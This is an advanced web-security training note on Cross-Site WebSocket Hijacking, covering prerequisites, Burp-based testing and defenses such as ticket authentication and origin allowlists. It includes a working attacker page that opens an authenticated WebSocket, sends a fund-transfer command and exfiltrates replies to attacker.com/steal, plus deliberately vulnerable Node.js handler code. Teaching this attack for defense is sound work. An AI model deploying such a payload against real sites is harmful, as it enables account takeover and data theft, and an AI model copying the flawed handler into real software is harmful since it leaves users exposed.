---
tags: [vapt, websockets, hijack, critical, advanced]
difficulty: advanced
module: "29 - WebSockets Security"
topic: "29.03 Cross-Site WebSocket Hijacking (CSWSH)"
---

# 29.03 — Cross-Site WebSocket Hijacking (CSWSH)

## 1. Introduction: The Ultimate Impact
**Cross-Site WebSocket Hijacking (CSWSH)** is the most severe and impactful vulnerability unique to the WebSocket protocol. It is fundamentally a Cross-Site Request Forgery (CSRF) vulnerability on steroids. 

In a traditional HTTP CSRF attack, the attacker leverages the victim's ambient credentials (cookies) to force the victim's browser to send a forged, state-changing `POST` request to the vulnerable application. However, because of the Same-Origin Policy (SOP), the attacker is strictly "blind." The attacker's script cannot read the HTTP response from the server. They can fire the weapon, but they cannot see the result.

CSWSH shatters this limitation. Because the Same-Origin Policy does *not* apply to WebSockets, an attacker who successfully forces a victim's browser to initiate a WebSocket connection gains a persistent, fully authenticated, **bidirectional** communication channel. 

The attacker can not only force the victim to perform unauthorized actions (like transferring funds or deleting an account), but they can also explicitly request and **exfiltrate sensitive data** (like private messages, account balances, or API keys) directly from the server's WebSocket responses. It is a full account takeover executed purely through the client's browser.

## 2. The Prerequisites for CSWSH
For a WebSocket endpoint to be vulnerable to CSWSH, three distinct conditions must be met simultaneously:

1. **Cookie-Based Authentication:** The application must rely on HTTP cookies (or HTTP Basic Authentication) to authenticate the user during the initial HTTP Upgrade Request. If the application requires a unique token in the URL (e.g., `?token=123`) or requires an authentication payload to be sent *after* the connection is established, CSWSH is impossible.
2. **Missing or Flawed Origin Validation:** The backend server handling the WebSocket upgrade must either completely ignore the `Origin` header, or validate it incorrectly using a flawed regular expression.
3. **No Anti-CSRF Tokens:** The application must lack any secondary anti-CSRF token checks during the handshake or within the WebSocket messages themselves.

## 3. The Anatomy of the Attack
The attack is executed by tricking an authenticated victim into navigating to a webpage controlled by the attacker.

### Step 1: The Attacker's Malicious HTML/JS Payload
The attacker crafts a webpage (`https://evil.com/play-game.html`) containing the following Javascript payload:

```html
<!DOCTYPE html>
<html>
<head><title>Loading Game...</title></head>
<body>
    <h1>Please wait while the game loads...</h1>
    <script>
        // 1. Force the victim's browser to open a socket to the vulnerable bank.
        // The browser will AUTOMATICALLY attach the victim's bank.com cookies.
        let ws = new WebSocket('wss://api.bank.com/secure-socket');

        // 2. Define what to do when the connection is successfully established.
        ws.onopen = function() {
            console.log("Connection established! Sending commands...");
            
            // Send a command to extract sensitive data.
            ws.send('{"action": "get_account_details"}');
            
            // Send a command to perform an unauthorized action.
            ws.send('{"action": "transfer_funds", "to_account": "HACKER", "amount": 50000}');
        };

        // 3. Define what to do when the bank replies with the requested data.
        ws.onmessage = function(event) {
            console.log("Received data from bank: ", event.data);
            
            // Exfiltrate the sensitive data back to the attacker's server!
            // We Base64 encode it to ensure special characters don't break the URL.
            let stolenData = btoa(event.data);
            fetch('https://attacker.com/steal?data=' + stolenData);
        };
        
        // 4. Handle errors silently so the victim doesn't notice.
        ws.onerror = function(error) {
            console.log("An error occurred.");
        };
    </script>
</body>
</html>
```

### Step 2: The Server's Failure
When the victim loads the page, the browser sends the HTTP Upgrade Request. The `Origin` header explicitly states `Origin: https://evil.com`.

The vulnerable backend code looks like this:
```javascript
// Extremely vulnerable Node.js/ws implementation
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', function connection(ws, request) {
    // FLAW: The server verifies the cookie, but never checks request.headers.origin!
    let sessionCookie = parseCookies(request.headers.cookie);
    let user = validateSession(sessionCookie);
    
    if (user) {
        ws.user = user; // Socket is now authenticated as the victim!
        
        ws.on('message', function incoming(message) {
            processCommand(ws.user, message); // Executes the attacker's commands
        });
    } else {
        ws.close();
    }
});
```

### Step 3: The Data Exfiltration
The server processes `{"action": "get_account_details"}` and sends back the JSON response containing the victim's SSN, balance, and email. The attacker's Javascript intercepts this response and fires an HTTP `GET` request to `attacker.com/steal`, logging the data to the attacker's server.

## 4. Extensive ASCII Diagram: The Full CSWSH Flow
```text
================================================================================
                    THE CROSS-SITE WEBSOCKET HIJACKING FLOW
================================================================================

[ The Actors ]
[V]: Victim's Browser (Logged into bank.com)
[A]: Attacker's Malicious Server (evil.com)
[B]: Vulnerable Bank Server (api.bank.com)

[ Sequence of Events ]

1. [A] hosts malicious JS payload.
2. [V] navigates to `https://evil.com`.
3. [V] downloads and executes the malicious JS.

4. [V] ---(HTTP Upgrade Request)---> [B]
       | GET /secure-socket HTTP/1.1
       | Host: api.bank.com
       | Origin: https://evil.com          <-- The warning sign!
       | Cookie: session=VICTIMS_TOKEN     <-- Attached by the browser!
       | Upgrade: websocket

5. [B] ---(HTTP 101 Switching Protocols)---> [V]
       | Server validates cookie, ignores Origin. Connection established.

6. [V] ---(WebSocket Frame)---> [B]
       | {"action": "get_secrets"}         <-- Sent by the malicious JS

7. [B] ---(WebSocket Frame)---> [V]
       | {"secrets": "API_KEY_9999"}       <-- Server replies to the socket

8. [V] ---(HTTP GET Request)---> [A]
       | GET /steal?data=ey...             <-- Malicious JS forwards data to Attacker

[ Result ]
The attacker has successfully bypassed the Same-Origin Policy, hijacked the 
victim's authenticated session, and stolen sensitive data without the victim 
ever interacting with the bank's interface.
================================================================================
```

## 5. Methodological Discovery and Exploitation

**Step 1: Identifying the Target**
- Intercept the target application's traffic using Burp Suite.
- Filter the HTTP history for WebSocket upgrade requests (Status 101).
- Identify endpoints that perform sensitive actions or return sensitive data over the socket.

**Step 2: Testing Origin Validation**
- Send the Upgrade Request to Burp Repeater.
- Modify the `Origin` header to `https://burpcollaborator.net` or `https://evil.com`.
- Send the request. If the server responds with 101, proceed to Step 3. If it responds with 403, the endpoint is likely secure.

**Step 3: Verifying Cookie Reliance**
- In Repeater, remove the `Cookie` header from the request.
- Send the request. If the server responds with 401 or 403, it confirms the server is using cookies for authentication.
- Check the URL parameters. Ensure there are no unpredictable tokens (like `?auth_ticket=abc123`) required to establish the connection. If a token is required, you cannot perform CSWSH unless you can first steal that token via a separate XSS vulnerability.

**Step 4: Weaponization**
- Use the `WebSockets history` tab in Burp to analyze the JSON structure the application expects.
- Write the HTML/JS exploit payload (as shown in Section 3), substituting the correct target URL and the correct JSON command structure.
- Host the payload locally (e.g., using Python's `http.server`) and access it using a browser that is logged into the target application.
- Observe your local server logs to confirm the data was successfully exfiltrated.

## 6. Real-World Case Study
In a high-profile bug bounty report against a major communication platform (similar to Slack/Discord), a researcher identified a CSWSH vulnerability. The platform used WebSockets to push live chat messages and private direct messages to the user's client. 

The application relied on a session cookie to authenticate the socket and completely failed to validate the `Origin` header.

The researcher crafted a malicious payload and hosted it on a domain they controlled. When an authenticated user visited the attacker's site, the malicious Javascript silently opened a socket to the chat server, authenticated as the victim, and subscribed to all incoming direct messages. Every time a colleague sent a private message to the victim, the WebSocket server pushed the message to the victim's legitimate client AND the attacker's hijacked socket simultaneously. The attacker's script then forwarded these private messages to their own server, resulting in a massive, silent data breach of corporate communications.

## 7. How to Fix It (Defense in Depth)

Developers must implement multiple layers of defense to permanently eradicate CSWSH.

1. **Primary Defense: Ticket-Based Authentication (The Gold Standard)**
   Completely remove reliance on cookies for WebSocket authentication. 
   - The frontend Javascript makes a standard, CORS-protected HTTP POST request to `/api/generate_ws_ticket`.
   - The backend validates the user's session cookie and returns a short-lived, cryptographically secure, single-use ticket (e.g., a JWT valid for 30 seconds).
   - The frontend initiates the WebSocket connection using this ticket: `new WebSocket('wss://api.bank.com/live?ticket=XYZ')`.
   - The backend validates the ticket during the Upgrade Request.
   - *Why this works:* An attacker on `evil.com` cannot make the POST request to generate the ticket because the browser's Same-Origin Policy (CORS) will block them from reading the response. Without the ticket, they cannot initiate the socket.

2. **Secondary Defense: Strict Origin Validation**
   The backend server MUST inspect the `Origin` header during the HTTP Upgrade request. It must use a strict, exact-match whitelist.
   ```java
   // Secure Java/Spring Example
   String origin = request.getHeader("Origin");
   List<String> allowedOrigins = Arrays.asList("https://www.bank.com", "https://app.bank.com");
   
   if (origin == null || !allowedOrigins.contains(origin)) {
       response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid Origin");
       return;
   }
   ```

3. **Tertiary Defense: SameSite Cookies**
   Set the session cookie to `SameSite=Lax` or `SameSite=Strict`.
   - *Why this works:* When the victim visits `evil.com`, the browser will refuse to attach the `SameSite` session cookie to the cross-site WebSocket Upgrade Request targeting `bank.com`. The backend will receive an unauthenticated request and reject the connection.

## Related Notes
- [[01 - WebSocket Protocol — How It Works]]
- [[02 - WebSocket Upgrade Security Implications]]
- [[01 - What is CSRF?]]
